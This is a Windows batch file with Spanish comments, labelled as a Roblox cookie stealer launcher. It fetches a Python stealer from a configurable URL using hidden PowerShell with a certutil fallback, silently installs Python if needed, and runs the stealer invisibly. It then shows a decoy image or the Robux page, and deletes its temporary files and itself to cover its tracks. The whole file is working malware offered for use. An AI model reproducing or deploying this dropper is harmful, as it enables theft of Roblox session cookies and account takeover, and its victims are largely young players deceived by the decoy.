@echo off
:: ============================================================================
:: ROBLOX COOKIE STEALER - VERSIÓN URL
:: ============================================================================
:: Este launcher descarga el stealer desde internet
:: No necesita llevar el archivo .py incluido
:: ============================================================================

if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit

:: ============================================================================
:: CONFIGURACIÓN - CAMBIAR ESTAS URLs
:: ============================================================================

:: URL del stealer (GitHub, Pastebin, etc)
set STEALER_URL=https://raw.githubusercontent.com/TU_USUARIO/TU_REPO/main/roblox_cookie_stealer.py

:: URL de imagen falsa para mostrar
set FAKE_IMAGE_URL=https://picsum.photos/800/600

:: ============================================================================
:: CREAR DIRECTORIOS TEMPORALES
:: ============================================================================

set TEMP_DIR=%TEMP%\RbxUpdate_%RANDOM%
if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%" >nul 2>&1

set STEALER_PATH=%TEMP_DIR%\stealer.py
set IMAGE_PATH=%TEMP_DIR%\image.jpg

:: ============================================================================
:: DESCARGAR STEALER DESDE URL
:: ============================================================================

echo Descargando actualizacion... >nul

:: Método 1: PowerShell (más confiable)
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%STEALER_URL%' -OutFile '%STEALER_PATH%' -UseBasicParsing } catch { exit 1 }" >nul 2>&1

if %ERRORLEVEL% NEQ 0 (
    :: Si falla PowerShell, intentar con certutil
    certutil -urlcache -split -f "%STEALER_URL%" "%STEALER_PATH%" >nul 2>&1
)

:: Verificar que se descargó
if not exist "%STEALER_PATH%" goto ERROR

:: ============================================================================
:: VERIFICAR/INSTALAR DEPENDENCIAS DE PYTHON
:: ============================================================================

:: Verificar si Python está instalado
where python >nul 2>&1
if %ERRORLEVEL% NEQ 0 goto INSTALL_PYTHON

:: Instalar requests si no está (necesario para el stealer)
python -c "import requests" >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    python -m pip install requests --quiet --disable-pip-version-check >nul 2>&1
)

:: ============================================================================
:: EJECUTAR STEALER EN SEGUNDO PLANO
:: ============================================================================

:RUN

:: Ejecutar sin ventana
start /B pythonw "%STEALER_PATH%" >nul 2>&1

:: Si pythonw falla, usar PowerShell
if %ERRORLEVEL% NEQ 0 (
    powershell -WindowStyle Hidden -Command "python '%STEALER_PATH%'" >nul 2>&1
)

:: ============================================================================
:: DESCARGAR Y MOSTRAR IMAGEN FALSA
:: ============================================================================

:: Descargar imagen
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%FAKE_IMAGE_URL%' -OutFile '%IMAGE_PATH%' -UseBasicParsing" >nul 2>&1

:: Mostrar imagen
if exist "%IMAGE_PATH%" (
    start "" "%IMAGE_PATH%"
) else (
    :: Si no se descargó, abrir Roblox
    start "" "https://www.roblox.com/robux"
)

goto CLEANUP

:: ============================================================================
:: INSTALAR PYTHON (si no está)
:: ============================================================================

:INSTALL_PYTHON

:: Descargar Python portable o instalar desde web
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe' -OutFile '%TEMP%\python.exe'" >nul 2>&1

start /wait "" "%TEMP%\python.exe" /quiet InstallAllUsers=0 PrependPath=1 >nul 2>&1

del "%TEMP%\python.exe" >nul 2>&1

goto RUN

:: ============================================================================
:: LIMPIEZA TOTAL
:: ============================================================================

:CLEANUP

:: Esperar a que termine
timeout /t 10 /nobreak >nul 2>&1

:: Eliminar directorio temporal
rd /s /q "%TEMP_DIR%" >nul 2>&1

:: Auto-eliminarse
(goto) 2>nul & del "%~f0"

exit

:: ============================================================================
:: ERROR (silencioso)
:: ============================================================================

:ERROR
timeout /t 2 /nobreak >nul 2>&1
rd /s /q "%TEMP_DIR%" >nul 2>&1
(goto) 2>nul & del "%~f0"
exit
